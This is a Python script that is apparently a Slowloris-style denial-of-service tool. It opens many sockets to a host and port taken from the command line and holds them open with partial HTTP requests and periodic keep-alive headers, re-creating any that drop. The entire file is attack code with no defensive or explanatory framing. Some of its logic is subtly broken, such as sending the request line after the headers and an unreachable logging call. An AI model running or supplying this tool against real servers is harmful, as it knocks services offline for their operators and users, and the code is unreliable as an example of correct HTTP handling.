import requests
import random
import socket
import time
import logging
import sys

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))

    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))

    return s

def send_request(s, method="GET", url="/", headers=None, data=None):
    # Generate random headers for each request if not provided
    if not headers:
        headers = random.choice(regular_headers)
    s.send("{}\r\n".format(headers).encode('UTF-8'))

    # Add random data to the request body
    if data:
        s.send(data.encode('UTF-8'))

    # Send the request
    request = "{} {} HTTP/1.1\r\n".format(method, url)
    s.send(request.encode('UTF-8'))

def main():
    if len(sys.argv) < 5:
        print("Usage: {} example.com 80 100 10".format(sys.argv[0]))
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count = int(sys.argv[3])
    print('\033[1;32;40m Creating Sockets...')
    timer = int(sys.argv[4])
    socket_list = []

    for _ in range(socket_count):
        try:
            s = init_socket(ip, port)
        except socket.error:
            break
        socket_list.append(s)
        print('.', end='', flush=True)

    print('\n')

    while True:
        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))

        for s in socket_list:
            try:
                # Add a random delay to the next keep-alive header
                time.sleep(random.randint(1, 10))

                # Choose a random HTTP method
                http_methods = ["GET", "POST", "PUT", "DELETE"]
                method = random.choice(http_methods)

                # Generate a random URL
                urls = ["/", "/page1", "/page2", "/api/data"]
                url = random.choice(urls)

                # Generate random data for POST/PUT requests
                data = None
                if method in ["POST", "PUT"]:
                    data = generate_random_data()

                # Generate custom headers for the request
                headers = generate_custom_headers()

                send_request(s, method, url, headers, data)

                # Process and handle the HTTP response
                response = s.recv(1024)
                # You can add your response processing logic here
                # For example, logging the response status code
                logging.info("Response status code: {}".format(response.decode('UTF-8')))
            except socket.error:
                socket_list.remove(s)
                logging.error("Socket error occurred.")

        for _ in range(socket_count - len(socket_list)):
            print("\033[1;34;40m\nRe-creating Socket...")
            try:
                s = init_socket(ip, port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break
                logging.error("Failed to create socket.")

        time.sleep(timer)

        # Check for errors
        for s in socket_list:
            try:
                s.recv(1024)
            except socket.error:
                socket_list.remove(s)
                logging.error("Socket error occurred.")

        if len(socket_list) == 0:
            break

        # Add a random delay to the time between each keep-alive header
        time.sleep(random.randint(1, 10))

def generate_random_data():
    # Generate random data for the request body
    data_size = random.randint(1, 1024)
    return 'x' * data_size

def generate_custom_headers():
    # Generate custom headers for the request
    custom_headers = [
        "X-Request-ID: {}".format(random.randint(1, 1000)),
        "Content-Type: application/json"
    ]
    return random.choice(custom_headers)

if __name__ == "__main__":
    logging.basicConfig(filename="log.txt", level=logging.INFO)
    main()
